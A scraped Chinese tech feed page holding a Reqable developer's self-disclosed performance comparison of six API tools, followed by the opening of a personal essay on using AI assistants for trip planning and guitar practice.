.task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><p>大家好，我是Reqable的开发者，很久没有对产品的性能进行摸底了，上一次测试还是2024年初。因此，我决定在3.1版本开始之前再做了一次整体性能的统计，顺便也拉上了几家同行，做个对比测试，了解下这个赛道里的各家情况。</p>
<p>这几家同行，有国内的也有国外的，全都是知名产品。这里先叠个甲，<strong>本篇文章的测试受限于设备、网络、系统、随机情况等等可能会有偏差，测试结果不代表软件的品质，仅供参考</strong>。</p>
<p>测试设备和环境：</p>
<ul>
<li>13英寸的MacBook Pro</li>
<li>M2芯片</li>
<li>8G内存</li>
<li>Sequoia 15.7的系统</li>
<li>200M的网络带宽。</li>
</ul>
<p>下面，我们来看看各个维度的测试结果。</p>
<h2 data-id="heading-0">1. 启动时间</h2>
<p>相信大家最关心的就是程序的启动时间了，每次测试都让我想起很多年前在大学宿舍里比谁电脑的Windows系统启动更快的那个下午。</p>
<p><strong>时间就是效率，效率就是早点干完活去摸鱼。</strong></p>
<p>测试前的准备工作，每个测试程序都提前先初始化一遍，有账号系统的的登录账号，再导入同一个API集合（一共32个API），并且打开集合中的第一个API，其他的配置都保持初始化的状态不变。</p>
<p>打开视频录制，依次启动每个测试程序。我们将程序启动瞬间到界面数据完整显示这个时间差，视为启动时间，通过视频编辑工具获取视频画面帧来计算，下面是数据表格：</p>















































<table><thead><tr><th>API工具</th><th>开始时间点</th><th>完成时间点</th><th>启动时间（秒）</th></tr></thead><tbody><tr><td><strong>Reqable</strong></td><td>0.01.30</td><td>0.01.70</td><td>0.4</td></tr><tr><td><strong>ApiFox</strong></td><td>0.03.12</td><td>0.06.55</td><td>3.43</td></tr><tr><td><strong>ApiPost</strong></td><td>0.07.19</td><td>0.12.78</td><td>5.59</td></tr><tr><td><strong>Postman</strong></td><td>0.14.29</td><td>0.17.09</td><td>2.8</td></tr><tr><td><strong>Insomnia</strong></td><td>0.18.88</td><td>0.23.40</td><td>4.52</td></tr><tr><td><strong>Bruno</strong></td><td>0.25.12</td><td>0.27.32</td><td>2.2</td></tr></tbody></table>
<p>下面是完整的测试视频（已转GIF）：</p>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/1632dae8c30a49468816fa713e4fd5e5~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgTWVnYXRyb25LaW5n:q75.awebp?rk3s=f64ab15b&amp;x-expires=1769523793&amp;x-signature=Tk89to7g4ESc2RUei0AFROAkqM8%3D" alt="test.gif" loading="lazy"/></p>
<p>我们来简单分析下这个测试结果。视频可以看出，Reqable在双击应用图标之后，程序窗口几乎立刻就出现了，这是得益于<code>Flutter</code>框架带来的原生般的窗口启动速度。而其他程序，几乎都要等待至少1s才会出现窗口，他们都有一个共同特点，用的<code>Electron</code>框架，在启动窗口之前要先启动多个进程，然后加载浏览器内核等等，最后才会启动窗口。</p>
<p>窗口启动后就是加载数据，比较慢的几款程序可以明显看到一个较长的加载过程，和网络状况以及服务器状况息息相关，纯离线存储的Bruno则快很多（没有网络请求的过程）。Reqable虽然也使用了云端数据，但是策略上会先加载本地数据，然后再从云端增量更新，因此不会受到网络因素影响，速度就极快。</p>
<p>在断网情况下，ApiFox、ApiPost和Postman三款都无法正常进入应用，Reqable、Insomnia和Bruno则可以正常进入，而且可以观察到Insomnia的启动速度会有明显提升。如果遇到网络或者服务器故障，前三款都将停摆，只有后三款能正常启动。</p>
<p>另外，由于设计问题，Insomnia和Bruno打开进入就是首页，并没有自动加载之前打开的API，这一点节省了些许时间。</p>
<p>总结一下，上面只有Reqable做到了秒启动，断崖式领先其他几款。可以预测，在有大量的API数据的时候，Reqable的启动优势会更加明显。</p>
<h2 data-id="heading-1">2. 空间占用</h2>
<p>接下来我们看看安装包和所需要的安装空间。安装包的大小代表着更新和下载需要多久，也是我们性能评估的一个重要指标，安装包体积越大往往意味着潜在用户变成真正用户的门槛越高。安装空间代表着需要占用用户多大的磁盘空间，对于堪比黄金的Mac SSD来说，肯定是越小越好。</p>








































<table><thead><tr><th>API工具</th><th>安装包大小（MB）</th><th>安装空间（MB）</th></tr></thead><tbody><tr><td><strong>Reqable</strong></td><td>30.7</td><td>86.7</td></tr><tr><td><strong>ApiFox</strong></td><td>226.2</td><td>705.2</td></tr><tr><td><strong>ApiPost</strong></td><td>125.6</td><td>340.2</td></tr><tr><td><strong>Postman</strong></td><td>122.2</td><td>317.9</td></tr><tr><td><strong>Insomnia</strong></td><td>341.7</td><td>1020</td></tr><tr><td><strong>Bruno</strong></td><td>155.1</td><td>417.6</td></tr></tbody></table>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/e3686b4109a84d58a568d2995d2d5b04~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgTWVnYXRyb25LaW5n:q75.awebp?rk3s=f64ab15b&amp;x-expires=1769523793&amp;x-signature=qvqBpFWWTwreMyTo9himYn1Hm1k%3D" alt="image.png" loading="lazy"/></p>
<p>需要注意的是，这里的安装空间仅仅代表软件最少所需空间，在软件启动后可能还会从服务器拉取必要的资源。这也是我们经常做安装包优化时常常采取的方案。</p>
<p>难以置信！Insomnia的安装所需空间已经夸张得超过了1个G，记得2024年测试过一次才不到600M。ApiFox也不遑多让，至少需要700M的空间，安装包也超过了200M。ApiPost和Postman两者差不多，虽然也不小，但是比前面这两个好多了。</p>
<p>Postman官网下载的安装包没有Mac专用的dmg格式，而是zip格式。由于两者都是压缩包，只是格式不同，实际上区别并不大。</p>
<p>Reqable的表现依然很优秀，30M多一点的安装包和不到90M的安装空间，是真正的小而美。</p>
<h2 data-id="heading-2">3. 内存占用</h2>
<p>如果说前面的安装包大小和安装空间对于现代大容量SSD工作设备来说无所谓的话，那么运行时的内存占用还是会有很大影响的，毕竟现在内存条的价格一直在涨涨涨。</p>
<p>内存占用测试的方式也很简单，我们将每个应用程序都启动了，然后置于后台（也就是啥事都不干），然后用系统自带的活动监视器查看这些应用的内存使用情况即可。由于应用程序可能有多个进程，我们需要将全部进程的内存占用计算总和。</p>








































<table><thead><tr><th>API工具</th><th>进程总数</th><th>内存占用总和（MB）</th></tr></thead><tbody><tr><td><strong>Reqable</strong></td><td>1</td><td>103.4</td></tr><tr><td><strong>ApiFox</strong></td><td>9</td><td>824.8</td></tr><tr><td><strong>ApiPost</strong></td><td>4</td><td>328.6</td></tr><tr><td><strong>Postman</strong></td><td>6</td><td>517.3</td></tr><tr><td><strong>Insomnia</strong></td><td>4</td><td>437</td></tr><tr><td><strong>Bruno</strong></td><td>4</td><td>282.2</td></tr></tbody></table>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/82665572e36b42deab7d0ae7249cff1c~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgTWVnYXRyb25LaW5n:q75.awebp?rk3s=f64ab15b&amp;x-expires=1769523793&amp;x-signature=IXGqURIkvK57tAMkNGajLxJqkug%3D" alt="image.png" loading="lazy"/></p>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/77b4e0331b8f487c8a91d0220b316076~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgTWVnYXRyb25LaW5n:q75.awebp?rk3s=f64ab15b&amp;x-expires=1769523793&amp;x-signature=okxA5eqkler1NtpbtWziu1eWEXs%3D" alt="image.png" loading="lazy"/></p>
<p>这组数据里面最耀眼的是ApiFox共有9个进程超过800M的内存使用，我一度以为操作失误，重复开了应用，反复验证后发现数据并没有问题。</p>
<p>其次就是Postman的6个进程超过500M的内存使用。</p>
<p>Reqable只有100M多一点，只有一个主进程，意味着没有任何的后台进程，干净后台。</p>
<p>请注意，以上数据仅仅是启动应用不做任何操作置于后台，运行时的内存使用相信只多不少。</p>
<hr/>
<p>三个维度测试结束，<a href="https://link.juejin.cn?target=https%3A%2F%2Freqable.com%2F" target="_blank" title="https://reqable.com/" ref="nofollow noopener noreferrer">Reqable</a>在这些API工具里面是绝对当之无愧的性能之王! 虽然随着科技的进步，设备的性能越来越高，但是谁不爱又快又小又干净的应用程序呢？</p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[2025，AI 就这样溜进了我生活的边边角角]]></title>    <link>https://juejin.cn/post/7597125475602268187</link>    <guid>https://juejin.cn/post/7597125475602268187</guid>    <pubDate>2026-01-20T13:43:19.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7597125475602268187" data-draft-id="7597125475602202651" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="2025，AI 就这样溜进了我生活的边边角角"/> <meta itemprop="keywords" content="后端,人工智能"/> <meta itemprop="datePublished" content="2026-01-20T13:43:19.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="苏渡苇"/> <meta itemprop="url" content="https://juejin.cn/user/729731453429159"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="掘金"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            2025，AI 就这样溜进了我生活的边边角角
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/729731453429159/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    苏渡苇
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2026-01-20T13:43:19.000Z" title="Tue Jan 20 2026 13:43:19 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2026-01-20
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    阅读7分钟
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body .octicon{display:inline-block;fill:currentColor;vertical-align:text-bottom}.markdown-body .anchor{float:left;line-height:1;margin-left:-20px;padding-right:4px}.markdown-body .anchor:focus{outline:none}.markdown-body h1 .octicon-link,.markdown-body h2 .octicon-link,.markdown-body h3 .octicon-link,.markdown-body h4 .octicon-link,.markdown-body h5 .octicon-link,.markdown-body h6 .octicon-link{color:#1b1f23;vertical-align:middle;visibility:hidden}.markdown-body h1:hover .anchor,.markdown-body h2:hover .anchor,.markdown-body h3:hover .anchor,.markdown-body h4:hover .anchor,.markdown-body h5:hover .anchor,.markdown-body h6:hover .anchor{text-decoration:none}.markdown-body h1:hover .anchor .octicon-link,.markdown-body h2:hover .anchor .octicon-link,.markdown-body h3:hover .anchor .octicon-link,.markdown-body h4:hover .anchor .octicon-link,.markdown-body h5:hover .anchor .octicon-link,.markdown-body h6:hover .anchor .octicon-link{visibility:visible}.markdown-body h1:hover .anchor .octicon-link:before,.markdown-body h2:hover .anchor .octicon-link:before,.markdown-body h3:hover .anchor .octicon-link:before,.markdown-body h4:hover .anchor .octicon-link:before,.markdown-body h5:hover .anchor .octicon-link:before,.markdown-body h6:hover .anchor .octicon-link:before{width:16px;height:16px;content:" ";display:inline-block;background-image:url("data:image/svg+xml;charset=utf-8,%3Csvg xmlns='http://www.w3.org/2000/svg' width='16' height='16' aria-hidden='true'%3E%3Cpath fill-rule='evenodd' d='M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z'/%3E%3C/svg%3E")}.markdown-body{-ms-text-size-adjust:100%;-webkit-text-size-adjust:100%;color:#24292e;font-family:-apple-system,BlinkMacSystemFont,Segoe UI,Helvetica,Arial,sans-serif,Apple Color Emoji,Segoe UI Emoji;font-size:16px;line-height:1.5;word-wrap:break-word}.markdown-body details{display:block}.markdown-body summary{display:list-item}.markdown-body a{background-color:initial}.markdown-body a:active,.markdown-body a:hover{outline-width:0}.markdown-body strong{font-weight:inherit;font-weight:bolder}.markdown-body h1{margin:.67em 0}.markdown-body img{border-style:none}.markdown-body code,.markdown-body kbd,.markdown-body pre{font-family:monospace,monospace;font-size:1em}.markdown-body hr{box-sizing:initial;overflow:visible}.markdown-body input{font:inherit;margin:0;overflow:visible}.markdown-body [type=checkbox]{box-sizing:border-box;padding:0}.markdown-body *{box-sizing:border-box}.markdown-body input{font-family:inherit;font-size:inherit;line-height:inherit}.markdown-body a{color:#0366d6;text-decoration:none}.markdown-body a:hover{text-decoration:underline}.markdown-body strong{font-weight:600}.markdown-body hr{height:0;margin:15px 0;overflow:hidden;background:transparent;border-bottom:1px solid #dfe2e5}.markdown-body hr:after,.markdown-body hr:before{display:table;content:""}.markdown-body hr:after{clear:both}.markdown-body table{border-spacing:0;border-collapse:collapse}.markdown-body td,.markdown-body th{padding:0}.markdown-body details summary{cursor:pointer}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{margin-top:0;margin-bottom:0}.markdown-body h1{font-size:32px}.markdown-body h1,.markdown-body h2{font-weight:600}.markdown-body h2{font-size:24px}.markdown-body h3{font-size:20px}.markdown-body h3,.markdown-body h4{font-weight:600}.markdown-body h4{font-size:16px}.markdown-body h5{font-size:14px}.markdown-body h5,.markdown-body h6{font-weight:600}.markdown-body h6{font-size:12px}.markdown-body p{margin-top:0;margin-bottom:10px}.markdown-body blockquote{margin:0}.markdown-body ol,.markdown-body ul{padding-left:0;margin-top:0;margin-bottom:0}.markdown-body ol ol,.markdown-body ul ol{list-style-type:lower-roman}.markdown-body ol ol ol,.markdown-body ol ul ol,.markdown-body ul ol ol,.markdown-body ul ul ol{list-style-type:lower-alpha}.markdown-body dd{margin-left:0}.markdown-body code,.markdown-body pre{font-family:SFMono-Regular,Consolas,Liberation Mono,Menlo,monospace;font-size:12px}.markdown-body pre{margin-top:0;margin-bottom:0}.markdown-body input::-webkit-inner-spin-button,.markdown-body input::-webkit-outer-spin-button{margin:0;-webkit-appearance:none;appearance:none}.markdown-body :checked+.radio-label{position:relative;z-index:1;border-color:#0366d6}.markdown-body .border{border:1px solid #e1e4e8!important}.markdown-body .border-0{border:0!important}.markdown-body .border-bottom{border-bottom:1px solid #e1e4e8!important}.markdown-body .rounded-1{border-radius:3px!important}.markdown-body .bg-white{background-color:#fff!important}.markdown-body .bg-gray-light{background-color:#fafbfc!important}.markdown-body .text-gray-light{color:#6a737d!important}.markdown-body .pl-3,.markdown-body .px-3{padding-left:16px!important}.markdown-body .px-3{padding-right:16px!important}.markdown-body .f6{font-size:12px!important}.markdown-body .lh-condensed{line-height:1.25!important}.markdown-body .text-bold{font-weight:600!important}.markdown-body .pl-c{color:#6a737d}.markdown-body .pl-c1,.markdown-body .pl-s .pl-v{color:#005cc5}.markdown-body .pl-e,.markdown-body .pl-en{color:#6f42c1}.markdown-body .pl-s .pl-s1,.markdown-body .pl-smi{color:#24292e}.markdown-body .pl-ent{color:#22863a}.markdown-body .pl-k{color:#d73a49}.markdown-body .pl-pds,.markdown-body .pl-s,.markdown-body .pl-s .pl-pse .pl-s1,.markdown-body .pl-sr,.markdown-body .pl-sr .pl-cce,.markdown-body .pl-sr .pl-sra,.markdown-body .pl-sr .pl-sre{color:#032f62}.markdown-body .pl-smw,.markdown-body .pl-v{color:#e36209}.markdown-body .pl-bu{color:#b31d28}.markdown-body .pl-ii{color:#fafbfc;background-color:#b31d28}.markdown-body .pl-c2{color:#fafbfc;background-color:#d73a49}.markdown-body .pl-c2:before{content:"^M"}.markdown-body .pl-sr .pl-cce{font-weight:700;color:#22863a}.markdown-body .pl-ml{color:#735c0f}.markdown-body .pl-mh,.markdown-body .pl-mh .pl-en,.markdown-body .pl-ms{font-weight:700;color:#005cc5}.markdown-body .pl-mi{font-style:italic;color:#24292e}.markdown-body .pl-mb{font-weight:700;color:#24292e}.markdown-body .pl-md{color:#b31d28;background-color:#ffeef0}.markdown-body .pl-mi1{color:#22863a;background-color:#f0fff4}.markdown-body .pl-mc{color:#e36209;background-color:#ffebda}.markdown-body .pl-mi2{color:#f6f8fa;background-color:#005cc5}.markdown-body .pl-mdr{font-weight:700;color:#6f42c1}.markdown-body .pl-ba{color:#586069}.markdown-body .pl-sg{color:#959da5}.markdown-body .pl-corl{text-decoration:underline;color:#032f62}.markdown-body .mb-0{margin-bottom:0!important}.markdown-body .my-2{margin-bottom:8px!important;margin-top:8px!important}.markdown-body .pl-0{padding-left:0!important}.markdown-body .py-0{padding-top:0!important;padding-bottom:0!important}.markdown-body .pl-1{padding-left:4px!important}.markdown-body .pl-2{padding-left:8px!important}.markdown-body .py-2{padding-top:8px!important;padding-bottom:8px!important}.markdown-body .pl-3{padding-left:16px!important}.markdown-body .pl-4{padding-left:24px!important}.markdown-body .pl-5{padding-left:32px!important}.markdown-body .pl-6{padding-left:40px!important}.markdown-body .pl-7{padding-left:48px!important}.markdown-body .pl-8{padding-left:64px!important}.markdown-body .pl-9{padding-left:80px!important}.markdown-body .pl-10{padding-left:96px!important}.markdown-body .pl-11{padding-left:112px!important}.markdown-body .pl-12{padding-left:128px!important}.markdown-body hr{border-bottom-color:#eee}.markdown-body kbd{display:inline-block;padding:3px 5px;font:11px SFMono-Regular,Consolas,Liberation Mono,Menlo,monospace;line-height:10px;color:#444d56;vertical-align:middle;background-color:#fafbfc;border:1px solid #d1d5da;border-radius:3px;box-shadow:inset 0 -1px 0 #d1d5da}.markdown-body:after,.markdown-body:before{display:table;content:""}.markdown-body:after{clear:both}.markdown-body&gt;:first-child{margin-top:0!important}.markdown-body&gt;:last-child{margin-bottom:0!important}.markdown-body a:not([href]){color:inherit;text-decoration:none}.markdown-body blockquote,.markdown-body details,.markdown-body dl,.markdown-body ol,.markdown-body p,.markdown-body pre,.markdown-body table,.markdown-body ul{margin-top:0;margin-bottom:16px}.markdown-body hr{height:.25em;padding:0;margin:24px 0;background-color:#e1e4e8;border:0}.markdown-body blockquote{padding:0 1em;color:#6a737d;border-left:.25em solid #dfe2e5}.markdown-body blockquote&gt;:first-child{margin-top:0}.markdown-body blockquote&gt;:last-child{margin-bottom:0}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{margin-top:24px;margin-bottom:16px;font-weight:600;line-height:1.25}.markdown-body h1{font-size:2em}.markdown-body h1,.markdown-body h2{padding-bottom:.3em;border-bottom:1px solid #eaecef}.markdown-body h2{font-size:1.5em}.markdown-body h3{font-size:1.25em}.markdown-body h4{font-size:1em}.markdown-body h5{font-size:.875em}.markdown-body h6{font-size:.85em;color:#6a737d}.markdown-body ol,.markdown-body ul{padding-left:2em}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:0;margin-bottom:0}.markdown-body li{word-wrap:break-all}.markdown-body li&gt;p{margin-top:16px}.markdown-body li+li{margin-top:.25em}.markdown-body dl{padding:0}.markdown-body dl dt{padding:0;margin-top:16px;font-size:1em;font-style:italic;font-weight:600}.markdown-body dl dd{padding:0 16px;margin-bottom:16px}.markdown-body table{display:block;width:100%;overflow:auto}.markdown-body table th{font-weight:600}.markdown-body table td,.markdown-body table th{padding:6px 13px;border:1px solid #dfe2e5}.markdown-body table tr{background-color:#fff;border-top:1px solid #c6cbd1}.markdown-body table tr:nth-child(2n){background-color:#f6f8fa}.markdown-body img{max-width:100%;box-sizing:initial;background-color:#fff}.markdown-body img[align=right]{padding-left:20px}.markdown-body img[align=left]{padding-right:20px}.markdown-body code{padding:.2em .4em;margin:0;font-size:85%;background-color:rgba(27,31,35,.05);border-radius:3px}.markdown-body pre{word-wrap:normal}.markdown-body pre&gt;code{padding:0;margin:0;font-size:100%;word-break:normal;white-space:pre;background:transparent;border:0}.markdown-body .highlight{margin-bottom:16px}.markdown-body .highlight pre{margin-bottom:0;word-break:normal}.markdown-body .highlight pre,.markdown-body pre{padding:16px;overflow:auto;font-size:85%;line-height:1.45;background-color:#f6f8fa;border-radius:3px}.markdown-body pre code{display:inline;max-width:auto;padding:0;margin:0;overflow:visible;line-height:inherit;word-wrap:normal;background-color:initial;border:0}.markdown-body .commit-tease-sha{display:inline-block;font-family:SFMono-Regular,Consolas,Liberation Mono,Menlo,monospace;font-size:90%;color:#444d56}.markdown-body .full-commit .btn-outline:not(:disabled):hover{color:#005cc5;border-color:#005cc5}.markdown-body .blob-wrapper{overflow-x:auto;overflow-y:hidden}.markdown-body .blob-wrapper-embedded{max-height:240px;overflow-y:auto}.markdown-body .blob-num{width:1%;min-width:50px;padding-right:10px;padding-left:10px;font-family:SFMono-Regular,Consolas,Liberation Mono,Menlo,monospace;font-size:12px;line-height:20px;color:rgba(27,31,35,.3);text-align:right;white-space:nowrap;vertical-align:top;cursor:pointer;-webkit-user-select:none;-moz-user-select:none;-ms-user-select:none;user-select:none}.markdown-body .blob-num:hover{color:rgba(27,31,35,.6)}.markdown-body .blob-num:before{content:attr(data-line-number)}.markdown-body .blob-code{position:relative;padding-right:10px;padding-left:10px;line-height:20px;vertical-align:top}.markdown-body .blob-code-inner{overflow:visible;font-family:SFMono-Regular,Consolas,Liberation Mono,Menlo,monospace;font-size:12px;color:#24292e;word-wrap:normal;white-space:pre}.markdown-body .pl-token.active,.markdown-body .pl-token:hover{cursor:pointer;background:#ffea7f}.markdown-body .tab-size[data-tab-size="1"]{-moz-tab-size:1;tab-size:1}.markdown-body .tab-size[data-tab-size="2"]{-moz-tab-size:2;tab-size:2}.markdown-body .tab-size[data-tab-size="3"]{-moz-tab-size:3;tab-size:3}.markdown-body .tab-size[data-tab-size="4"]{-moz-tab-size:4;tab-size:4}.markdown-body .tab-size[data-tab-size="5"]{-moz-tab-size:5;tab-size:5}.markdown-body .tab-size[data-tab-size="6"]{-moz-tab-size:6;tab-size:6}.markdown-body .tab-size[data-tab-size="7"]{-moz-tab-size:7;tab-size:7}.markdown-body .tab-size[data-tab-size="8"]{-moz-tab-size:8;tab-size:8}.markdown-body .tab-size[data-tab-size="9"]{-moz-tab-size:9;tab-size:9}.markdown-body .tab-size[data-tab-size="10"]{-moz-tab-size:10;tab-size:10}.markdown-body .tab-size[data-tab-size="11"]{-moz-tab-size:11;tab-size:11}.markdown-body .tab-size[data-tab-size="12"]{-moz-tab-size:12;tab-size:12}.markdown-body .task-list-item{list-style-type:none}.markdown-body .task-list-item+.task-list-item{margin-top:3px}.markdown-body .task-list-item input{margin:0 .2em .25em -1.6em;vertical-align:middle}</style><style data-highlight="" data-highlight-key="github">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><blockquote>
<p>年初那阵子，朋友圈、技术群到处都在转<strong>DeepSeek</strong>的消息。我也下载了，随后，豆包、千问也挤进了启动栏。而原本安静的编码时光，现在被Cursor和Trae这些会思考的IDE重新定义了——它们不再是等待指令的工具，而是开始主动提问，在我写下一行代码前，就已经给出了三四种可能。</p>
<p>谁知道用着用着，这东西就从我电脑屏幕里溜出来，钻进了我生活的各个角落，成了我的日常“搭子”。</p>
</blockquote>
<h2 data-id="heading-0">周末的旅行攻略</h2>
<p>周六早餐，我们一家人吃完饭对着餐桌发呆，老婆问：“又周末了，我们去哪儿玩儿？”</p>
<p>这个问题每年都让我们头疼。我顺手打开<strong>DeepSeek</strong>：“两个怕累的上班族，带着俩娃，两天假期，不想去网红城市。”</p>
<p>三分钟后，一份行程躺在屏幕上。不是那种“上午长城下午故宫”的标准模板——它建议了一个周边的小镇，连“周日下午三点去x路，那会儿阳光斜照适合拍照”这种细节都有。</p>
<p>最绝的是它补了句：“当地有家开了三十年的面馆，下午两点以后浇头选择最多。”</p>
<p>我们真的去了。照着它的攻略，在那个周日下午三点走进新密的东西大街，它是石板路老街，阳光透过老槐树的枝叶洒在路面上，光影斑驳。</p>
<p>面馆也找到了，老板娘听说我们是“网上看到”的，笑得很开心：“现在的年轻人，真会找地方。”</p>
<h2 data-id="heading-1">我那把落了灰的吉他</h2>
<p>书房角落里的吉他，指板上的灰攒了有一阵子了。</p>
<p>直到某个稍微不那么忙的下午，我鬼使神差地打开它，发现连G和弦都按不准了。</p>
<p>我在<strong>豆包</strong>对话框里打字：“如何快速练习吉他？每天只有半小时。”</p>
<p>它没给我枯燥的爬格子练习，反而说：“先找你以前最喜欢的那首歌，哪怕只弹前奏。记忆会让手指慢慢醒过来。”</p>
<p>我找了《曾经的你》这首歌，发现 Bm 和弦真 tm 难按，我拍照发给它：“这个 Bm 和弦，小拇指没力气。”</p>
<p>它回复得很快：“试试把拇指放在琴颈背后，正对食指和中指之间。Bm需要手腕往前送一点，像在推门。</p>
<p>最让我惊讶的是它的耐心。同样的问题我问了它三遍，它给了三种不同的比喻：握鸡蛋、搭帐篷、按门铃。而它永远不会埋怨你：“这么简单都记不住？”</p>
<p>现在，那把吉他常常竖在床头，但指板上没有灰了。</p>
<h2 data-id="heading-2">它帮我写工作报告</h2>
